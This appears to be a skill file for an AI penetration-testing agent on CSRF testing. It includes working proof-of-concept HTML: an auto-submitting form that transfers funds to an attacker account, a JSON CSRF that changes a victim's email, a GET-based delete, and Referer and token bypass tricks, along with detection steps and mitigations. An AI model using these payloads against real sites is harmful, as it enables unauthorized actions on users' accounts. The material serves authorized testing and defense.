---
name: csrf-testing
description: Professional skills and methodology for CSRF (Cross-Site Request Forgery) testing
version: 1.0.0
---

# CSRF Cross-Site Request Forgery Testing

## Overview

CSRF (Cross-Site Request Forgery) is an attack technique that leverages a user's already authenticated state to perform unauthorized actions. This skill provides methods for detecting, exploiting, and mitigating CSRF vulnerabilities.

## Vulnerability Principle

- The attacker lures the user into visiting a malicious page
- The malicious page automatically sends a request to the target site
- The browser automatically includes the user's authentication information (Cookie, Session)
- The target site mistakes it for a legitimate action by the user

## Testing Methods

### 1. Identify Sensitive Operations

- Password change
- Email change
- Funds transfer
- Privilege change
- Data deletion
- Status update

### 2. Detect CSRF Token

**Check whether there is Token protection:**
```html
<!-- With Token protection -->
<form method="POST" action="/change-password">
  <input type="hidden" name="csrf_token" value="abc123">
  <input type="password" name="new_password">
</form>

<!-- No Token protection - CSRF risk present -->
<form method="POST" action="/change-email">
  <input type="email" name="new_email">
</form>
```

### 3. Verify Token Validity

**Test whether the Token is predictable:**
- Whether the Token is based on a timestamp
- Whether the Token is based on the user ID
- Whether the Token can be reused
- Whether the Token is shared across multiple requests

### 4. Check Referer Validation

**Test whether the Referer check can be bypassed:**
```javascript
// Normal request
Referer: https://target.com/change-password

// Test bypass
Referer: https://target.com.evil.com
Referer: https://evil.com/?target.com
Referer: (empty)
```

## Exploitation Techniques

### Basic CSRF Attack

**HTML form auto-submit:**
```html
<form action="https://target.com/api/transfer" method="POST" id="csrf">
  <input type="hidden" name="to" value="attacker_account">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.getElementById('csrf').submit();</script>
```

### JSON CSRF

**Bypass Content-Type check:**
```html
<!-- Submit JSON using a form -->
<form action="https://target.com/api/update" method="POST" enctype="text/plain">
  <input name='{"email":"attacker@evil.com","ignore":"' value='"}'>
</form>
<script>document.forms[0].submit();</script>
```

### GET Request CSRF

**Attack using a GET request:**
```html
<img src="https://target.com/api/delete?id=123">
```

## Bypass Techniques

### Token Bypass

**If the Token is in a Cookie:**
```javascript
// If the Token exists in both the Cookie and the form
// you can try submitting only the Token in the Cookie
fetch('https://target.com/api/action', {
  method: 'POST',
  credentials: 'include',
  body: 'action=delete&id=123'
  // Does not include the csrf_token parameter, relies on the Cookie
});
```

### SameSite Cookie Bypass

**Leverage subdomains:**
- If SameSite=Lax, a GET request can still carry the Cookie
- Leverage subdomains to carry out the attack

### Double Submit Cookie

**Bypass Token validation:**
```html
<!-- If the Token is in a Cookie and the validation logic is flawed -->
<form action="https://target.com/api/action" method="POST">
  <input type="hidden" name="csrf_token" value="">
  <script>
    // Read the Token from the Cookie
    document.cookie.split(';').forEach(c => {
      if(c.trim().startsWith('csrf_token=')) {
        document.querySelector('input[name="csrf_token"]').value = 
          c.split('=')[1];
      }
    });
  </script>
</form>
```

## Tool Usage

### Burp Suite

**Use the CSRF PoC generator:**
1. Intercept the target request
2. Right-click → Engagement tools → Generate CSRF PoC
3. Test the generated PoC

### OWASP ZAP

```bash
# Use ZAP to run a CSRF scan
zap-cli quick-scan --self-contained --start-options '-config api.disablekey=true' http://target.com
```

## Verification and Reporting

### Verification Steps

1. Confirm the target operation has no CSRF Token protection
2. Craft a malicious request and verify it can be executed
3. Assess the impact (data leakage, privilege escalation, financial loss, etc.)
4. Record a complete PoC
5. Use the `report_finding` tool to record the confirmed vulnerability in the platform (the only entry point for recording vulnerabilities on this platform); the fields cover location, type, severity, reproduction steps/PoC, and remediation advice

### Reporting Key Points

- Vulnerability location and the affected operation
- Attack scenario and scope of impact
- Complete exploitation steps and PoC
- Remediation advice (CSRF Token, SameSite Cookie, Referer validation, etc.)

## Mitigation Measures

### Recommended Solutions

1. **CSRF Token**
   - Each form includes a unique Token
   - The Token is stored in the Session
   - Validate the Token's validity

2. **SameSite Cookie**
   ```javascript
   Set-Cookie: session=abc123; SameSite=Strict; Secure
   ```

3. **Double Submit Cookie**
   - The Token exists in both the Cookie and the form
   - Verify that the two match

4. **Referer Validation**
   - Verify that the Referer is same-origin
   - Pay attention to how an empty Referer is handled

## Notes

- Perform only in an authorized testing environment
- Avoid causing real impact to user accounts
- Record all testing steps
- Consider behavioral differences across browsers
